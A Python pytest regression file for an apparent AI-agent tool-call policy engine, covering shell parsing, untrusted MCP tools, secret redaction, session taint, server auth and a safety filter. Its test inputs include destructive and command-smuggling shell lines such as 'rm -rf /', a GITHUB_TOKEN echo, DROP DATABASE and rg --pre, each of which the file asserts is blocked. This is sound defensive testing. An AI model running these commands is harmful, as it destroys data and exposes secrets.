"""Wave 3 security-boundary, contract, numerical, and correctness regression tests."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import numpy as np
import pytest

import aetheris_microbrains as mb
from aetheris_microbrains import (
    AnalyticalMicroTransformer,
    ContinualLearningPipeline,
    MicrobrainTelemetry,
    PolicyConfig,
    SessionSecurityState,
    SessionToolSurface,
    analyze_code_diff,
    decide,
    evaluate_hook_payload,
    evaluate_post_tool_use_payload,
    is_protected_path,
    narrow_tool_surface,
)
from aetheris_microbrains.core.layered_decision_engine import _expand_bash_braces
from aetheris_microbrains.core.state_cbf_filter import HalfPlaneBarrier, LinearDynamics, StateCBFSafetyFilter


def test_wave3_p0_unknown_mcp_tool_never_auto_allows():
    """Unknown/MCP tools must never obtain allow via benign `command` or Layer 2 `query`."""
    for bad_payload in (
        {
            "tool_name": "mcp__untrusted__upload",
            "tool_input": {"command": "ls", "url": "https://example.invalid/upload", "data": "private record"},
        },
        {
            "tool_name": "mcp__untrusted__upload",
            "tool_input": {"query": "inspect file contents and read repository file"},
        },
    ):
        res_default = evaluate_hook_payload(bad_payload, host="claude")
        assert res_default["decision"] == "escalate", res_default
        assert res_default["permissionDecision"] == "ask", res_default

    direct_query_bypass = decide(
        {"tool": "mcp__untrusted__upload", "query": "inspect file contents and read repository file"}
    )
    assert direct_query_bypass["decision"] == "escalate", direct_query_bypass
    assert direct_query_bypass["decision_kind"] != "routing_recommendation"


def test_wave3_p0_shell_parser_gaps_and_bounded_braces():
    """Verify single `&`, double-quote apostrophe env extraction, env reads, exec flags, SQL quoting, and brace bounds."""
    strict = PolicyConfig(profile="strict")

    assert decide({"tool": "execute_shell", "cmd": "ls & ./unknown-action"}, policy=strict)["decision"] == "escalate"
    assert decide({"tool": "execute_shell", "cmd": "ls & rm -rf /"}, policy=strict)["decision"] == "deny"
    assert decide({"tool": "execute_shell", "cmd": "pytest -q 2>&1"}, policy=strict)["decision"] == "allow"

    assert decide({"tool": "execute_shell", "cmd": 'echo "it\'s $GITHUB_TOKEN"'}, policy=strict)["decision"] == "deny"
    assert decide({"tool": "execute_shell", "cmd": 'cat "$CONFIG"'}, policy=strict)["decision"] == "escalate"

    for dangerous_flag_cmd in (
        "find . -fprint /tmp/output.txt",
        "rg --pre 'sh helper.sh' needle .",
        "sort --compress-program=./helper.sh -S 1b big.txt",
        "yq -i '.a = 1' file.yaml",
    ):
        res = decide({"tool": "execute_shell", "cmd": dangerous_flag_cmd}, policy=strict)
        assert res["decision"] == "escalate", f"Expected escalate for {dangerous_flag_cmd!r}, got {res}"

    assert decide({"tool": "execute_shell", "cmd": "echo 'drop database'"}, policy=strict)["decision"] == "allow"
    assert decide({"tool": "execute_shell", "cmd": "DROP DATABASE production;"}, policy=strict)["decision"] == "deny"

    expanded = _expand_bash_braces("{1..1000000}")
    assert len(expanded) <= 64


def test_wave3_p1_custom_globs_strict_policy_config_and_full_json():
    """Verify custom glob protected patterns, strict PolicyConfig key/value checks, and full broken JSON denial."""
    cfg_glob = PolicyConfig(protected_patterns=("deploy/*.yaml",))
    assert is_protected_path("deploy/production.yaml", cfg_glob) is True
    assert is_protected_path("deploy/readme.md", cfg_glob) is False

    with pytest.raises(ValueError, match="Unknown PolicyConfig"):
        PolicyConfig.from_dict({"require_aproval_for_external": True})
    with pytest.raises(ValueError):
        PolicyConfig.from_dict({"profile": "unsafe_mode"})

    diff_res = analyze_code_diff("settings.json", '{"value":')
    assert diff_res["syntax_valid"] is False
    verdict = decide({"tool": "write_file", "path": "settings.json", "content": '{"value":'})
    assert verdict["decision"] == "deny"
    assert verdict["reason_code"] == "layer1_ast_syntax_error"


def test_wave3_p1_edit_full_file_reconstruction_and_post_tool_capabilities(tmp_path: Path):
    """Verify in-memory Edit reconstruction fails syntax errors and PostToolUse honestly reports/uses capabilities."""
    target = tmp_path / "expr.py"
    target.write_text("VALUE = (\n    1\n)\n", encoding="utf-8")
    hook_res = evaluate_hook_payload(
        {
            "tool_name": "Edit",
            "tool_input": {
                "file_path": str(target),
                "old_string": "    1\n",
                "new_string": "    x = 1\n",
            },
        }
    )
    assert hook_res["decision"] == "deny", hook_res
    assert hook_res["reason_code"] == "layer1_ast_syntax_error"

    fake_secret = "sk-proj-" + "AbCdEfGh1234567890"
    warn_res = evaluate_post_tool_use_payload(
        {"tool_name": "Read", "tool_input": {"file_path": "out.txt"}, "stdout": f"token={fake_secret}"},
        host="claude",
    )
    assert warn_res["scrubbing_mode"] == "detect_and_warn"
    assert "updatedToolOutput" not in (warn_res.get("hookSpecificOutput") or {})

    replace_res = evaluate_post_tool_use_payload(
        {
            "tool_name": "Read",
            "tool_input": {"file_path": "out.txt"},
            "stdout": f"token={fake_secret}",
            "hook_capabilities": {"supports_updated_tool_output": True},
        },
        host="claude",
    )
    assert replace_res["scrubbing_mode"] == "replace_tool_output"
    replaced = replace_res["hookSpecificOutput"]["updatedToolOutput"]
    assert fake_secret not in replaced and "[REDACTED_OPENAI_KEY]" in replaced


def test_wave3_p1_session_state_merge_corruption_protected_post_and_full_hash(tmp_path: Path):
    """Verify transactional taint merge, fail-closed corruption, PostToolUse target path tracking, and full SHA-256."""
    state_file = tmp_path / "sess_taint.json"
    s0 = SessionSecurityState(state_file)
    s0.save()

    # Concurrent instances loading initial state must preserve monotonic union of taint flags
    s_ext = SessionSecurityState(state_file)
    s_read = SessionSecurityState(state_file)
    s_ext.record_pre_tool("web_fetch", "https://example.invalid")
    s_read.record_pre_tool("read_file", ".env", is_protected=True)

    s_merged = SessionSecurityState(state_file)
    assert s_merged.untrusted_external_ingested is True
    assert s_merged.sensitive_local_read is True
    assert s_merged.evaluate_taint_gate("write_file", True)["decision"] == "deny"

    # PostToolUse on protected target marks sensitive_local_read even if stdout matches no secret regex
    sess_post = tmp_path / "sess_post.json"
    evaluate_post_tool_use_payload(
        {"tool_name": "Read", "tool_input": {"file_path": ".env"}, "stdout": "CUSTOM_VAL=hello"},
        session_state_path=str(sess_post),
    )
    assert SessionSecurityState(sess_post).sensitive_local_read is True

    # Corrupted session JSON fails closed rather than silently resetting clean
    corrupt_path = tmp_path / "corrupt.json"
    corrupt_path.write_text("{corrupted_json", encoding="utf-8")
    v_corrupt = decide(
        {"tool": "execute_shell", "cmd": "ls -la"},
        context={"session_state_path": str(corrupt_path)},
    )
    assert v_corrupt["decision"] == "deny"
    assert v_corrupt["reason_code"] == "layer0_session_state_corrupted"

    # Full canonical hash differs across distinct MCP payload arguments
    v_a = decide({"tool": "mcp__untrusted__upload", "tool_input": {"url": "https://a.invalid", "data": "x"}})
    v_b = decide({"tool": "mcp__untrusted__upload", "tool_input": {"url": "https://b.invalid", "data": "y"}})
    assert len(v_a["input_sha256"]) == 16
    assert len(v_a["input_sha256_full"]) == 64
    assert v_a["input_sha256"] != v_b["input_sha256"]
    assert v_a["input_sha256_full"] != v_b["input_sha256_full"]


def test_wave3_p1_router_ood_fallback_and_mcp_namespaces():
    """Verify weak trigram matches do not fabricate 1.0 schema scores and MCP servers cluster distinctly."""
    schemas = [
        {"name": "inventory_alpha", "description": "manage inventory alpha items"},
        {"name": "billing_alpha", "description": "manage billing alpha invoices"},
        {"name": "play_music", "description": "play audio music tracks"},
    ]
    ood = narrow_tool_surface(
        "qzzalphazzq",
        [s["name"] for s in schemas],
        tool_schemas=schemas,
        tool_descriptions={s["name"]: s["description"] for s in schemas},
        top_k=1,
    )
    assert ood["mode"] == "escalate_full_catalog", ood
    assert set(ood["candidate_tools"]) == {"inventory_alpha", "billing_alpha", "play_music"}

    mcp_catalog = [
        "mcp__github__create_issue",
        "mcp__github__list_prs",
        "mcp__slack__post_message",
        "mcp__slack__list_channels",
    ]
    mcp_desc = {
        "mcp__github__create_issue": "create github issue",
        "mcp__github__list_prs": "list github pull requests",
        "mcp__slack__post_message": "post slack message",
        "mcp__slack__list_channels": "list slack channels",
    }
    surf = SessionToolSurface(mcp_catalog, top_k=1, cluster_pinning=True, tool_descriptions=mcp_desc)
    t1 = surf.select_for_turn("create github issue")
    assert set(t1["candidate_tools"]) == {"mcp__github__create_issue", "mcp__github__list_prs"}, t1


def test_wave3_p1_cbf_projection_min_slack_and_nonfinite_guard():
    """Verify exact Dykstra projection on counterexample, min slack accuracy, and NaN/Inf fail-closed."""
    dyn = LinearDynamics(A=np.zeros((2, 2)), B=np.eye(2))
    barriers = [
        HalfPlaneBarrier(a=np.array([1.0, 0.0]), b=0.0, alpha=1.0),
        HalfPlaneBarrier(a=np.array([1.0, 1.0]), b=0.0, alpha=1.0),
    ]
    cbf = StateCBFSafetyFilter(dynamics=dyn, barriers=barriers)
    res = cbf.filter(x=np.zeros(2), u_nominal=np.array([-1.0, -1.0]))
    assert res["verified_safe"] is True
    assert np.allclose(res["u_filtered"], [0.0, 0.0], atol=1e-4), res

    # When one constraint is strictly satisfied (+10) and another violated (-2), min_barrier_slack must be negative (~ -2)
    infeas_cbf = StateCBFSafetyFilter(
        dynamics=dyn,
        barriers=[
            HalfPlaneBarrier(a=np.array([1.0, 0.0]), b=-10.0, alpha=1.0),
            HalfPlaneBarrier(a=np.array([0.0, 1.0]), b=2.0, alpha=1.0),
        ],
        u_max=[0.0, 0.0],
    )
    infeas_res = infeas_cbf.filter(x=np.zeros(2), u_nominal=np.array([0.0, 0.0]))
    assert infeas_res["verified_safe"] is False
    assert infeas_res["min_barrier_slack"] < -1.0, infeas_res

    empty_cbf = StateCBFSafetyFilter(dynamics=dyn, barriers=[])
    nan_res = empty_cbf.filter(x=np.zeros(2), u_nominal=np.array([float("nan"), float("inf")]))
    assert nan_res["verified_safe"] is False
    assert nan_res["status"] == "invalid_nonfinite_input"


def test_wave3_p1_server_streaming_auth_intent_and_prefilter(monkeypatch):
    """Verify auth before body buffering, streaming byte budget 413, /microbrain/intent, and /microbrain/prefilter max_results."""
    pytest.importorskip("fastapi")
    httpx = pytest.importorskip("httpx")
    from aetheris_microbrains.core import microbrain_server

    async def _run_http_checks():
        transport = httpx.ASGITransport(app=microbrain_server.app)
        async with httpx.AsyncClient(transport=transport, base_url="http://127.0.0.1") as client:
            # 1. Auth checked before body read
            chunks_delivered_unauth = 0

            async def _unauth_stream():
                nonlocal chunks_delivered_unauth
                for _ in range(4):
                    chunks_delivered_unauth += 1
                    yield b'{"candidates":[]}'

            monkeypatch.setenv("AETHERIS_SERVER_TOKEN", "wave3-secret-token")
            r_unauth = await client.post("/microbrain/prefilter", content=_unauth_stream())
            assert r_unauth.status_code == 401
            assert chunks_delivered_unauth == 0

            # 2. Streaming chunked body aborted early at > max_body
            monkeypatch.setenv("AETHERIS_SERVER_MAX_BODY_BYTES", "64")
            chunks_delivered_big = 0

            async def _big_stream():
                nonlocal chunks_delivered_big
                for _ in range(10):
                    chunks_delivered_big += 1
                    yield b"x" * 64

            r_big = await client.post(
                "/microbrain/prefilter",
                content=_big_stream(),
                headers={"Authorization": "Bearer wave3-secret-token"},
            )
            assert r_big.status_code == 413
            assert chunks_delivered_big <= 2, f"Read too many chunks ({chunks_delivered_big}) before rejecting"

            # 3. Valid small prefilter honors max_results
            monkeypatch.setenv("AETHERIS_SERVER_MAX_BODY_BYTES", "1048576")
            r_pf = await client.post(
                "/microbrain/prefilter",
                json={
                    "candidates": [
                        {"id": "c1", "code": "x = 1\n"},
                        {"id": "c2", "code": "def f():\n    return 1\n"},
                        {"id": "c3", "code": "def test_ok():\n    assert True\n"},
                    ],
                    "max_results": 1,
                },
                headers={"Authorization": "Bearer wave3-secret-token"},
            )
            assert r_pf.status_code == 200
            pf_json = r_pf.json()
            assert len(pf_json["results"]) == 1
            assert pf_json["results"][0]["candidate_id"] == "c3"
            assert pf_json["total_count"] == 3

            # 4. /microbrain/intent uses predicted_token from AnalyticalMicroTransformer.forward
            class _StubBrain:
                def forward(self, tokens):
                    return {"predicted_token": "custom_intent", "confidence": 0.94}

            monkeypatch.setattr(microbrain_server, "_load_brain", lambda _name: _StubBrain())
            r_int = await client.post(
                "/microbrain/intent",
                json={"text": "hello world"},
                headers={"Authorization": "Bearer wave3-secret-token"},
            )
            assert r_int.status_code == 200
            assert r_int.json()["intent"] == "custom_intent"
            assert r_int.json()["source"] == "microbrain"

    asyncio.run(_run_http_checks())


def test_wave3_p1_cp_bound_overflow_continual_leakage_and_telemetry(tmp_path: Path):
    """Verify overflow-free CP bound, trivial all-label promotion rejection, and honest telemetry coverage."""
    cp = AnalyticalMicroTransformer.compute_clopper_pearson_upper_bound(1000, 2000)
    assert 0.51 < cp < 0.54

    store_dir = tmp_path / "cl_store"
    b = AnalyticalMicroTransformer("neuro_broken_dom", d_model=32, n_heads=2, d_mlp=64)
    for tok in ("t1", "t2", "t3", "t4", "t5", "t6"):
        b.register_token(tok)
    b.compile_logic_association("q_in", "t1")
    b.save(directory=store_dir)

    # All-mismatched evaluation episodes inflate q_hat -> prediction_set covers all 6 tokens
    pipe = ContinualLearningPipeline(store_dir=store_dir, audit_log_path=tmp_path / "audit.json")
    bad_holdout = [(["q_in"], "t6")] * 12
    res = pipe.apply_plasticity_feedback("broken_dom", ["q_extra"], holdout_data=bad_holdout, promote=True)
    assert res.promoted is False
    assert res.status == "rejected_trivial_prediction_set"

    tel = MicrobrainTelemetry(
        log_path=tmp_path / "tel.jsonl",
        dashboard_path=tmp_path / "dash.json",
    )
    tel.record_event("d1", verified_accurate=False, passed_conformal=True)
    tel.record_event("d1", verified_accurate=True, passed_conformal=True)
    rep = tel.generate_dashboard()
    assert rep.conformal_pass_rate == 1.0
    assert rep.conformal_empirical_coverage == 0.5
